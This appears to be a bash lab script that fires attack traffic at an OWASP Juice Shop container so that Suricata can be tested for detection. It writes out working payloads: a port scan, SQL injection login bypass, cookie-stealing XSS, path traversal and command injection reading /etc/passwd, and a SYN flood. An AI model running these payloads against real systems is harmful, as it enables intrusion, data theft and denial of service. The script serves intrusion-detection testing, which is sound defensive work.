#!/bin/bash
# Generates real, detectable attack traffic against the "victim" (OWASP Juice
# Shop) container. Every technique here is a genuine tool doing a genuine
# thing on the wire — Suricata is asked to notice it, not told the answer.
set -uo pipefail

TARGET="${TARGET:-victim}"
PORT="${PORT:-3000}"

section() { echo; echo "=== $1 ==="; }

section "1/5 Recon: nmap port + service scan (6+ ports -> port-scan behavior)"
nmap -Pn -sT -p 21,22,80,443,3000,3306,5432,8080,8443 "$TARGET"

section "2/5 SQL injection payloads against login/search"
curl -s -o /dev/null -w "  login SQLi -> HTTP %{http_code}\n" \
  -X POST "http://$TARGET:$PORT/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}'
curl -s -o /dev/null -w "  search SQLi -> HTTP %{http_code}\n" \
  "http://$TARGET:$PORT/rest/products/search?q=apple%27%20UNION%20SELECT%20*%20FROM%20Users--"

section "3/5 Cross-site scripting (XSS) payloads"
curl -s -o /dev/null -w "  reflected XSS -> HTTP %{http_code}\n" \
  "http://$TARGET:$PORT/rest/products/search?q=<script>alert(document.cookie)</script>"
curl -s -o /dev/null -w "  stored-style XSS -> HTTP %{http_code}\n" \
  "http://$TARGET:$PORT/#/search?q=<img src=x onerror=alert(1)>"

section "4/5 Directory traversal + command injection payloads"
curl -s --path-as-is -o /dev/null -w "  path traversal -> HTTP %{http_code}\n" \
  "http://$TARGET:$PORT/ftp/../../../../etc/passwd"
curl -s -o /dev/null -w "  cmd injection -> HTTP %{http_code}\n" \
  "http://$TARGET:$PORT/rest/products/1/reviews;cat%20/etc/passwd"

section "5/5 DoS-style SYN flood (short burst — lab only)"
timeout 3 nping --tcp -p "$PORT" --flags syn --rate 500 --count 100000 --no-capture -q "$TARGET" || true

echo
echo "Done. Traffic generated for: port scan, SQLi, XSS, path traversal, cmd injection, SYN flood."
